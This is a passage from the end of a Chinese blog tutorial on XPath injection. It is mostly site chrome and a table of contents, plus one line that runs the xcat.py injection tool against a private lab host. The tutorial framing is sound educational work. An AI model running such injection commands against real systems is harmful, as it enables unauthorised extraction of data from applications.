<p><a target="_blank" rel="noopener" href="http://xcat.py">xcat.py</a>  --method=GET --public-ip=“192.168.91.139” <a target="_blank" rel="noopener" href="http://192">http://192</a> .168.91.139/xml/example2.php name=hacker name “Hello hacker” run  retrieve</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/99440887?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168320378516782427481230%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168320378516782427481230&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-99440887-null-null.142%5Ev86%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&amp;utm_term=XPth%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3&amp;spm=1018.2226.3001.4187">Xpath注入</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/')">浅析Xpath注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=浅析Xpath注入&amp;url=http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/06/qian-xi-sql-zhu-ru/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">浅析sql注入</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/06/qian-xi-ssti-lou-dong/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析SSTI漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xpath%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">Xpath注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFxpath"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 什么是Xpath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-xpath%E7%9A%84%E7%AE%80%E5%8D%95%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 Xpath的简单演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-xpath%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 Xpath基础语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04xpath%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.</span> <span class="toc-text">0x04XPath注入的定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-xpath%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 xpath注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%B8%8B%E9%9D%A2%E5%8A%A8%E6%89%8B%E5%AE%9E%E6%93%8D%E4%BB%A5%E4%B8%8B%E9%83%BD%E6%98%AF%E8%B7%9F%E7%9D%80%E4%BD%AC%E5%81%9A%E7%9A%84"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 下面动手实操(以下都是跟着佬做的)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xpath%E5%AE%9E%E4%BE%8B1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Xpath实例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xpath%E5%AE%9E%E4%BE%8B%E4%BA%8C"><span class="toc-number">1.6.2.</span> <span class="toc-text">Xpath实例二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xpath-%E5%AE%9E%E5%88%97%E5%8E%9F%E7%90%86%E4%B8%89"><span class="toc-number">1.6.3.</span> <span class="toc-text">xpath 实列原理三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-xpath%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 XPath盲注的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-xpath%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E5%88%97"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 XPath攻击的实列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-xpath%E4%B9%8Bbwapp%E5%AE%9E%E4%BE%8B%E4%B8%80"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 xpath之bwapp实例一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-xpath%E4%B9%8Bbwapp%E5%AE%9E%E4%BE%8B%E4%BA%8C"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 XPath之bwapp实例二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-xpath%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 xpath挖掘利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12%E6%B5%85%E8%B0%88xpath%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-number">1.12.</span> <span class="toc-text">0x12浅谈XPath注入检测思路和方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-%E7%BB%8F%E5%85%B8xpath%E6%BA%90%E7%A0%81"><span class="toc-number">1.13.</span> <span class="toc-text">0x13 经典xpath源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-xpath%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.14.</span> <span class="toc-text">0x14 xpath危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-xpath%E9%98%B2%E5%BE%A1"><span class="toc-number">1.15.</span> <span class="toc-text">0x15 xpath防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-xpath%E5%B7%A5%E5%85%B7"><span class="toc-number">1.16.</span> <span class="toc-text">0x16 xpath工具</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
